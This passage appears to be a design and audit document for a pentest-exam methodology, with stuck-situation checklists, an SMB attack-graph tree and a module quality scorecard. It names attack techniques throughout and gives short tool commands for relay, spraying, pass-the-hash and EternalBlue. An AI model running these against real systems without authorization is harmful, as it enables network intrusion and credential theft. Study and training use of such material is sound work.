  - Check DNS Admin abuse path
  - Check Exchange (PRIV abuse)
  - Check LAPS configuration (can you read passwords?)
  - Check gMSA accounts (can you retrieve?)
  - Check trust relationships (child→parent, cross-forest)
  - Check for Shadow Credentials (msDS-KeyCredentialLink)
  - Check for GPO abuse paths

**Enumeration expansion strategies:**
- Compromise MORE hosts (different users may have different AD access)
- Spray ALL passwords against ALL users (systematically)
- Check for password in description fields (AD user attributes)
- Check for SYSVOL share access
- Review BloodHound for all edge types (not just obvious DA paths)
- Consider multi-step paths: User A→Group B→Admin C→DA

**Validation steps:**
- Did you run BloodHound with ALL collection methods?
- Did you use certipy for ADCS enumeration?
- Did you check delegation on ALL computers?
- Did you review ALL ACL edge types?
- Did you check trust relationships?
- Did you get DA session info from BloodHound?

### 5.6 Stuck: No Lateral Movement

**Likely causes:**
- No credentials for other hosts
- Other hosts on different subnet (not accessible)
- Firewall rules prevent cross-host access
- Credentials don't work on other hosts
- Target hosts have different local accounts

**Alternate techniques:**
- Check current host's ARP cache: `arp -a`
- Check routing table: `route print` / `netstat -rn`
- Check DNS cache for other hostnames
- Scan local subnet from compromised host
- Deploy pivot tool if multi-homed
- Check for shared local admin password (Pass-the-Hash)
- Check for PowerShell Remoting configuration
- Check for SSH key reuse (common in Linux environments)
- Check for credential manager entries (Windows)
- Check for password reuse (same password, different user)

**Enumeration expansion strategies:**
- Spray ALL credentials against ALL hosts
- Try different protocols: SMB, WinRM, RDP, SSH, WMI
- Check for services running with high privileges (MSSQL, Jenkins)
- Enumerate domain: may reveal hosts not in scope but reachable
- Use netexec to scan entire subnet for credential validity

**Validation steps:**
- Did you enumerate the current host's network fully?
- Did you check ARP cache?
- Did you check routing table?
- Did you try ALL credential types against ALL hosts?
- Did you check for password reuse?

### 5.7 Stuck: Pivot Not Working

**Likely causes:**
- No multi-homed host compromised
- Egress filtering on pivot host
- No root/admin on pivot host (needed for Ligolo)
- Pivot tool blocked by AV/EDR
- Wrong internal IP range (NAT confusion)
- Routing not configured correctly on attack host

**Alternate techniques:**
- Try different pivot tool:
  - `chisel` (no root needed on client)
  - `sshuttle` (simple, Linux target only)
  - `SSH -D` (dynamic SOCKS proxy)
  - `SSH -L` (single port forward)
  - `SocksOverRDP` (Windows target, RDP available)
- Try proxychains with SOCKS proxy
- Try `netsh port forwarding` (Windows)
- Try `socat` relay

**Enumeration expansion strategies:**
- Check ALL hosts for dual-homed configuration
- Check routing tables on ALL compromised hosts
- Check if you can install tools on pivot host
- Try static binary (statically compiled chisel/ligolo)

**Validation steps:**
- Is the pivot host actually multi-homed? (`ipconfig /all`, `ifconfig`)
- Can you ping the target subnet from the pivot?
- Is your routing table on attack host correct?
- Is the pivot tool running? (check process on target)
- Can you reach the attack host from the pivot? (firewall?)

---

## 6. Attack Graph Module Specification

### 6.1 Design for `99-attack-graph.md`

**File:** `modules/99-attack-graph.md`
**Purpose:** Central navigation system for the entire methodology.

**Design principles:**
1. Every finding in the methodology has an entry in the attack graph
2. Every entry asks "I found X. What now?" and answers with ALL possible paths
3. Paths are prioritized by success probability (exam context)
4. Every path has "if this fails" alternatives
5. Every path links directly to the relevant module

**Structure:**
```
# Module 99: Attack Graph & Decision Engine

## How to Use This Module
When you find something during testing, find it in the index below.
The attack graph shows:
- What to do next
- Why it works
- What evidence supports the decision
- What attack paths become available
- What credentials you can obtain
- What privilege escalation opportunities exist
- What lateral movement opportunities exist
- Alternative paths if the current path fails

## Finding Index (Alphabetical)

### [DNS Records Found](link)
### [FTP - Port 21 Open](link)
### [Kerberos - Port 88 Open](link)
### [LDAP Anonymous Bind](link)
### [LFI/RFI Found](link)
### [MSSQL - Port 1433 Open](link)
### [NFS - Port 2049 Open](link)
### [Password/Hash Obtained](link)
### [Responder Hash Captured](link)
### [SMB - Port 445 Open](link)
### [SQL Injection Found](link)
### [SSH Key Found](link)
### [Shell Obtained (Linux)](link)
### [Shell Obtained (Windows)](link)
### [Web - Port 80/443 Open](link)
### [Web - SQL Injection](link)
### [Web - File Upload](link)
### [Web - Command Injection](link)
### [Web - XSS](link)
### [Web - SSRF](link)
### [WinRM - Port 5985 Open](link)
| ... and ~50+ more findings

## Attack Graph Sections

### Network Findings
...
### Web Findings
...
### Service Findings
...
### Credential Findings
...
### Access Findings
...
### Active Directory Findings
...
### Pivoting Findings
...
### Stuck Situations
...
```

### 6.2 Section Detail (Example: SMB Section)

```
## Finding: SMB - Port 139/445 Open

### What You Found
Server Message Block service is running. This is the most service-important port for AD environments.

### Attack Graph

```
[445/TCP] SMB open
│
├── [STEP 1] Null session / Anonymous auth?
│   ├── YES → enum4linux, smbclient -N -L
│   │   ├── [ACTION] Enumerate users: rpcclient -U "" -N → enumdomusers
│   │   │   └── OUTPUT: User list → [→ Password Spraying]
│   │   ├── [ACTION] List shares: smbclient -N -L //target
│   │   │   ├── Readable share found? → Download files
│   │   │   │   ├── [CREDENTIAL OPPORTUNITY] Config files, DB strings
│   │   │   │   ├── [CREDENTIAL OPPORTUNITY] Unattend.xml (cpassword)
│   │   │   │   └── [CREDENTIAL OPPORTUNITY] SSH keys
│   │   │   └── Writable share found? → Upload payload
│   │   │       ├── [ACCESS] Web shell if share mapped to web dir
│   │   │       └── [LATERAL] File drop for phishing/exploit
│   │   └── [AD] Domain info dump
│   │       └── OUTPUT: Domain users, groups, policy → [→ AD Enumeration]
│   │
│   └── NO → Move to Step 2
│
├── [STEP 2] SMB signing check
│   ├── [ACTION] nmap --script smb2-security-mode -p 445 target
│   │   ├── Signing disabled?
│   │   │   ├── [CRITICAL] NTLM relay possible
│   │   │   │   ├── [ACTION] ntlmrelayx.py -tf targets.txt -smb2support
│   │   │   │   │   ├── [ACCESS] Code execution on relay target
│   │   │   │   │   └── [DOMAIN] Relay to ADCS → Certificate → DA
│   │   │   │   └── Alternative: Responder → SMB relay
│   │   │   └── Signing enabled → Move to Step 3
│   │   └── [ACTION] Check vulnerable versions
│   │       └── MS17-010 (EternalBlue)?
│   │           └── YES → [ACCESS] exploit/windows/smb/ms17_010_eternalblue
│   │
│   └── Move to Step 3
│
├── [STEP 3] Credentials available?
│   ├── YES → Authenticated SMB attacks
│   │   ├── [ACTION] netexec smb target -u user -p pass
│   │   │   ├── [PRIVESC] Admin? → psexec → SYSTEM shell
│   │   │   ├── [LATERAL] Pass-the-Hash → Multiple hosts
│   │   │   └── [ACCESS] SMBexec / WMIexec → Remote code
│   │   └── [ACTION] smbmap -H target -u user -p pass
│   │       └── Share access with creds → File search
│   │
│   └── NO → Move to password attacks
│       └── [→ Password Spraying] with domain users (from Step 1)
│
└── [STEP 4] Nothing working?
    ├── Check SMBv1 enabled: nmap --script smb-protocols
    ├── Check for RDCE (Remote Differential Compression)
    ├── Check for SMB signing not required (even if enabled)
    └── Move to next service → [Module 07]
```

### If This Fails (Alternative Paths)
- SMB null session failed → Check SMBv1 separately
- No shares accessible → Check for hidden shares (admin$, IPC$, C$)
- No users via RPC → Try LDAP anonymous bind → [→ LDAP Findings]
- Relay targets not available → Capture for offline cracking → [→ Password Attacks]
- No creds from any source → Move to web/service enumeration → [Module 02]

### Cross-References
- User enumeration from SMB → [Module 06: Password Attacks](../modules/06-password-attacks.md)
- Domain info from SMB → [Module 11: Active Directory](../modules/11-active-directory.md)
- SMB relay → [Module 12: Lateral Movement](../modules/12-lateral-pivot.md)
- Pass-the-Hash → [Module 12: Lateral Movement](../modules/12-lateral-pivot.md)
- Service enumeration flow → [Module 07: Common Services](../modules/07-common-services.md)

### Credentials Obtainable from This Path
- Domain usernames (null session)
- Domain user hashes (relay capture)
- Cleartext passwords (from config files on shares)
- Service account passwords (from config files)
- Domain admin credentials (from SYSVOL/GPP)

### Privilege Escalation Opportunities
- Write share → Web shell → RCE → OS user
- Domain user → AD enumeration path
- Pass-the-Hash → admin access on multiple hosts

### Lateral Movement Opportunities
- Pass-the-Hash to all hosts with same local admin
- Domain user credentials → RDP/WinRM/SSH to domain hosts
- SMB relay to other hosts (if signing disabled)
```

### 6.3 What `99-attack-graph.md` Answers

For each finding, the attack graph answers:

1. **"I found X. What should I do next?"** — Immediate step-by-step actions
2. **"Why should I do it?"** — The rationale and expected outcome
3. **"What evidence supports that decision?"** — What you'll see when it works
4. **"What attack paths become available?"** — What each step unlocks
5. **"What credentials can I obtain?"** — Explicit credential opportunities
6. **"What privilege escalation opportunities become available?"** — PrivEsc after finding
7. **"What lateral movement opportunities become available?"** — Lateral after finding
8. **"What alternative paths exist if the current path fails?"** — Failure recovery

### 6.4 Required Sections in `99-attack-graph.md`

1. **Network Access Findings**
   - Port 21 (FTP) open
   - Port 22 (SSH) open
   - Port 25 (SMTP) open
   - Port 53 (DNS) open
   - Port 80/443 (HTTP/S) open
   - Port 88 (Kerberos) open
   - Port 110/143 (POP3/IMAP) open
   - Port 135/139 (RPC/NetBIOS) open
   - Port 161 (SNMP) open
   - Port 389/636 (LDAP) open
   - Port 445 (SMB) open
   - Port 464 (Kerberos change) open
   - Port 1433 (MSSQL) open
   - Port 1521 (Oracle) open
   - Port 2049 (NFS) open
   - Port 3306 (MySQL) open
   - Port 3389 (RDP) open
   - Port 5432 (PostgreSQL) open
   - Port 5900 (VNC) open
   - Port 5985/5986 (WinRM) open
   - Port 6379 (Redis) open
   - Port 8080/8443 (Alt HTTP) open
   - Port 11211 (Memcached) open
   - Port 27017 (MongoDB) open
   - Unknown/non-standard port open

2. **Web Findings**
   - Technology fingerprinted (CMS detected)
   - SQL injection found
   - LFI/RFI found
   - Command injection found
   - File upload found
   - XSS found
   - SSRF found
   - XXE found
   - IDOR found
   - Authentication bypass found
   - API endpoint found
   - WebSocket endpoint found

3. **Service Findings**
   - FTP anonymous access
   - SMB null session
   - SMB writable share
   - SMB signing disabled
   - LDAP anonymous bind
   - MSSQL default creds
   - MySQL root access
   - PostgreSQL access
   - Redis no-auth
   - SNMP public community
   - NFS export available
   - SMTP open relay
   - DNS zone transfer available
   - VNC no-password

4. **Credential Findings**
   - Cleartext password obtained
   - NTLM hash obtained (from Responder)
   - NTLM hash obtained (from SAM/LSASS)
   - Kerberos TGS ticket (Kerberoast)
   - Kerberos AS-REP hash
   - SSH private key found
   - Database credentials found
   - API key/token found
   - Password hash (general)
   - GPP cpassword found
   - DPAPI master key found
   - Kerberos TGT obtained

5. **Access Findings**
   - Web shell obtained
   - Reverse/bind shell (Linux)
   - Reverse/bind shell (Windows)
   - WinRM session
   - RDP session
   - SSH session
   - MSSQL command execution (xp_cmdshell)
   - MySQL UDF execution

6. **Active Directory Findings**
   - Domain controller identified
   - Domain user credentials obtained
   - BloodHound DA path found
   - Kerberoastable account found
   - AS-REP roastable user found
   - Delegation (unconstrained) found
   - Delegation (constrained) found
   - RBCD found
   - ADCS vulnerable template found
   - DCSync rights available
   - ACL abuse path found
   - GPO abuse vector found
   - SMB relay to ADCS possible
   - Trust relationship discovered

7. **Pivoting & Network Findings**
   - Multi-homed host discovered
   - New subnet discovered
   - ARP cache entries
   - Routing table shows internal networks
   - DNS cache shows internal hostnames

8. **Stuck Situations**
   - No initial access
   - No priv escalation
   - No AD path
   - No lateral movement
   - Pivot not working
   - Breaking into DMZ

---

## 7. Methodology Quality Audit

### 7.1 Audit Scorecard

| Category | Score (1-10) | Explanation |
|----------|--------------|-------------|
| CPTS Objectives Coverage | 9/10 | All major CPTS objectives covered. Missing: Shadow Credentials, gMSA, LAPS, GPO abuse, DNS Admin abuse |
| Real-World PT Workflows | 8/10 | Follows real PT lifecycle. Weakness: doesn't model the iterative/parallel nature of real engagements well |
| Attack-Path Completeness | 6/10 | Modules describe techniques in isolation. Attack path connections between modules are weak. No finding-to-action graph |
| Enumeration Completeness | 9/10 | Excellent enumeration coverage across all modules. Port-by-port service descriptions in Module 02 are thorough |
| Privilege Escalation Completeness | 8/10 | Both Linux and Windows covered well. Missing: container escape chains, Windows group abuse (DNSAdmin, Server Operators) depth |
| Active Directory Completeness | 7/10 | Good basic AD chain but missing Shadow Credentials, full ADCS chain (ESC1-ESC10 all variations), DNS Admin, GPO abuse, SAML attacks |
| Exam Usability | 7/10 | Good module organization but no single "I found X, now what?" lookup. User must know which module to check. No quick-reference attack graph |
| Cross-Module References | 5/10 | References exist but are adjacency-based not attack-path-based. Many modules only reference 1-2 adjacent modules |
| Decision Tree Coverage | 4/10 | Only 3 of 16 modules have standalone decision trees. Critical gaps: SMB, password attacks, lateral movement, credential flow |
| Alternative Path Coverage | 3/10 | Very few modules document "if X fails, try Y." Most trees have a single path with no failure recovery |
| Credential Flow Tracking | 3/10 | No systematic tracking of where credentials flow. "Found cred → test everywhere" is guidance but not structured |
| Pivoting Documentation | 6/10 | Good tools coverage but no formal pivot decision tree. Also missing post-pivot re-enumeration workflow |

**Overall Score: 6.3/10**

### 7.2 Detailed Findings

#### CPTS Objectives Coverage (9/10)

**Strengths:**
- All major module topics from the 28 HTB Academy notes are represented
- Web application attacks have excellent depth (SQLi, LFI, XSS, CMDi, uploads)
- Service enumeration is comprehensive (all CPTS-relevant services covered)
- AD basic attack chain is solid (Kerberoast, AS-REP, DCSync, delegation)

**Weaknesses:**
- Missing several AD attack paths that appear in CPTS:
  - Shadow Credentials (msDS-KeyCredentialLink) — common in exam
  - LAPS password read — tested in CPTS
  - GPO abuse for privilege escalation — tested in CPTS
  - DNS Admin → SYSTEM on DC — tested in CPTS
  - PrintNightmare — legacy but relevant
  - NoPac (CVE-2021-42278/42287) — historical exam content
- No SSTI coverage (Server-Side Template Injection)
- No GraphQL API testing methodology
- Limited JWT attack coverage (only alg:none documented)

#### Real-World PT Workflows (8/10)

**Strengths:**
- Follows standard PTES lifecycle
- Pre-engagement phase is thorough
- Reporting module is comprehensive
- Good exam strategy guidance

**Weaknesses:**
- Doesn't model the iterative reality of modern pentesting
- Linear phase progression doesn't capture cred-crack-test-reuse loops
- No parallel execution guidance in individual modules (only in MASTER)
- No "find X during service testing that triggers web module" cross-pollination
- Doesn't account for multi-team engagements (web vs network vs AD)

#### Attack-Path Completeness (6/10)

**Strengths:**
- Individual modules have good internal decision trees
- MASTER_METHODOLOGY has solid phase transition rules
- AD attack flow tree is good (basic paths)

**Weaknesses:**
- **No attack graph exists** — No file answers "I found X, now what?"
- Attack paths are implicit — spread across multiple modules
- No credential flow tracking (cred → where → what access)
- No alternative path documentation
- Many multi-step chains require reading 3+ modules to understand
- No relative prioritization of attack paths

#### Enumeration Completeness (9/10)

**Strengths:**
- Port-by-port enumeration guidance in Module 02 is excellent
- Service-specific commands in Module 07 are thorough
- Web enumeration (content discovery, fingerprinting) is strong
- Includes NSE scripts for most services

**Weaknesses:**
- No enumeration prioritization (which ports to attack first)
- No "enumeration escalation" (what to do when basic enum fails)
- Missing enumeration for: gMSA, LAPS, ADCS, DNS
- No automated enumeration tool integration guidance (what to run when)

#### Privilege Escalation Completeness (8/10)

**Strengths:**
- Both Linux and Windows have complete standalone modules
- Decision trees with multiple vectors in priority order
- Good tool coverage (linpeas, winpeas, pspy)
- Common GTFOBins escapes documented

**Weaknesses:**
- **Linux:**
  - No container escape coverage (Docker → host → AD)
  - No AppArmor/SELinux bypass coverage
  - Limited kernel exploit coverage (only 4 CVEs listed)
  - No restricted shell escape decision tree
- **Windows:**
  - Missing group abuse depth (how to abuse each group)
  - No Active Directory Certificate Services for local privesc
  - Missing Windows sandbox escape
  - No AppLocker/DL bypass coverage
  - Limited kernel exploit coverage (only 3 CVEs listed)

#### Active Directory Completeness (7/10)

**Strengths:**
- Good basic attack chain (responder → spray → AS-REP → Kerberoast → BloodHound → DCSync)
- BloodHound edge types well-documented
- ACL abuse, delegation, ADCS all present
- Trust relationship attacks covered (basic)

**Weaknesses:**
- **Shadow Credentials:** Missing entirely (critical AD attack)
- **ADCS ESC chain:** Only ESC1, ESC3, ESC6, ESC8, ESC9/10 mentioned — no detail on execution
- **LAPS:** Not covered (can you read LAPS password?)
- **gMSA:** Not covered (can you retrieve gMSA password?)
- **GPO abuse:** Mentioned but no execution detail
- **DNS Admin abuse:** Not covered (can result in DC compromise)
- **SID filtering abuse:** No detail beyond trust mention
- **Kerberos delegation detail:** Unconstrained = OK, Constrained = OK, RBCD = minimal
- **Coercive auth techniques:** Printerbug, PetitPotam mentioned but no full chain
- **Cross-forest attacks:** Minimal detail
- **Machine account abuse:** Not covered

#### Exam Usability (7/10)

**Strengths:**
- Exam Strategy module is excellent
- Time budget framework is practical
- "When stuck" guidance exists in multiple modules
- Phase transition rules help with flow

**Weaknesses:**
- **No quick-find index** — Finding-specific lookup requires reading entire module
- **No attack graph** — Most critical missing piece for exam time management
- **Too much reading** — 3,700+ lines to find what you need during a timed exam
- **No host exhaustion checklist** — Formal "when to abandon this host" criteria not documented
- **No subnet tracking system** — During exam with pivoting, subnets multiply quickly
- **No credential database template** — Centralized credential tracking missing
- **No screenshot checklist** — What to screenshot at each step for the report

#### Cross-Module References (5/10)

**Strengths:**
- Adjacent modules typically reference each other
- MASTER_METHODOLOGY provides overall flow

**Weaknesses:**
- Most references are one-directional
- Many modules only reference 2-3 of the 15 other modules
- No backward references ("Module 07 → continue from Module 02")
- Attack-path cross-references are missing entirely
- No "trigger" model (when finding X occurs in Module Y, go to Module Z)

#### Decision Tree Coverage (4/10)

**Strengths:**
- AD attack flow tree is comprehensive for basic AD
- Web attack flow tree covers core web vectors
- Privesc flow tree covers Linux and Windows well

**Weaknesses:**
- Only 3 of 16 modules have standalone decision trees
- No tree for: SMB, FTP, databases, password attacks, lateral movement, pivoting, post-exploitation, credential flow, shell/initial access
- Many trees in modules are embedded in prose rather than visual ASCII
- Some trees lack failure branches

#### Alternative Path Coverage (3/10)

**Strengths:**
- MASTER_METHODOLOGY has "When Stuck" section
- Exam strategy has "When Completely Stuck" guidance

**Weaknesses:**
- Individual modules almost never document "if this fails, try that"
- No formal alternative path branching in any decision tree
- No "escalation ladder" (what to do when the first 3 things don't work)
- No automated enumeration → manual enumeration → deep enumeration progression

#### Credential Flow Tracking (3/10)

**Strengths:**
- Module 13 (Post-Exploitation) lists credential harvesting techniques
- Module 06 (Password Attacks) covers cracking workflow

**Weaknesses:**
- No systematic credential tracking across the methodology
- No "credential received → what service to test" matrix
- No credential reuse testing formalized
- No credential inventory template
- No credential → privilege level mapping
- No hash type → cracking priority flow

#### Pivoting Documentation (6/10)

**Strengths:**
- Tools coverage is good (Ligolo-ng, Chisel, SSHuttle, SSH)
- Decision flow for tool selection exists
- Post-pivot actions documented

**Weaknesses:**
- No standalone pivoting decision tree (referenced but doesn't exist)
- No "post-pivot re-enumeration" workflow formalized
- No multi-subnet tracking system
- No subnet inventory template
- No "how to find the pivot" from a compromised host

---

## Summary of Critical Actions

### Immediate Priority (Blocking for Exam Effectiveness)

| Action | Deliverable | Impact |
|--------|-------------|--------|
| Create attack graph module | `modules/99-attack-graph.md` | Central navigation: "I found X, now what?" |
| Create SMB decision tree | `decision-trees/smb-attack-flow.md` | Most common service in AD, must have standalone tree |
| Create password attack tree | `decision-trees/password-attack-flow.md` | Parallel process, must have standalone decision flow |
| Create lateral movement tree | `decision-trees/lateral-pivot-flow.md` | Referenced but doesn't exist |
| Create credential flow tree | `decision-trees/credential-flow.md` | Tracks credentials across modules |
| Create stuck matrix section | In `99-attack-graph.md` or standalone | Troubleshooting framework |

### High Priority (Significant Quality Improvement)

| Action | Deliverable | Impact |
|--------|-------------|--------|
| Create recon/OSINT tree | `decision-trees/recon-osint-flow.md` | First phase, sets up everything |
| Create database attack tree | `decision-trees/database-attack-flow.md` | Unified DB attack flow |
| Create post-exploitation tree | `decision-trees/post-exploit-flow.md` | Every new host triggers this |
| Add ADCS depth | Update `modules/11-active-directory.md` | Critical CPTS content gap |
| Add Shadow Credentials | Update `modules/11-active-directory.md` | Common exam path |
| Add alternative paths to all trees | Update all decision trees | Failure recovery |
| Add host exhaustion checklist | Update `modules/15-exam-strategy.md` | Prevents wasted time |

### Medium Priority (Polishing)

| Action | Deliverable | Impact |
|--------|-------------|--------|
| Create app attack tree | `decision-trees/app-attack-flow.md` | CMS/application decision flow |
| Create initial access tree | `decision-trees/initial-access-flow.md` | RCE-to-shell decision flow |
| Add container escape coverage | Update `modules/09-linux-privesc.md` | Missing attack vector |
| Add DNS Admin abuse | Update `modules/10-windows-privesc.md` | Missing privesc path |
| Add GPO abuse depth | Update `modules/11-active-directory.md` | Missing AD attack path |
| Add LAPS abuse | Update `modules/11-active-directory.md` | Missing AD attack path |
| Add gMSA abuse | Update `modules/11-active-directory.md` | Missing AD attack path |
| Add SSTI coverage | Update `modules/04-web-application.md` | Missing web attack |
| Add GraphQL testing | Update `modules/04-web-application.md` | Growing attack surface |
| Add JWT attack depth | Update `modules/04-web-application.md` | Current alg:none only |

---

## End of Phase 2 Design Document
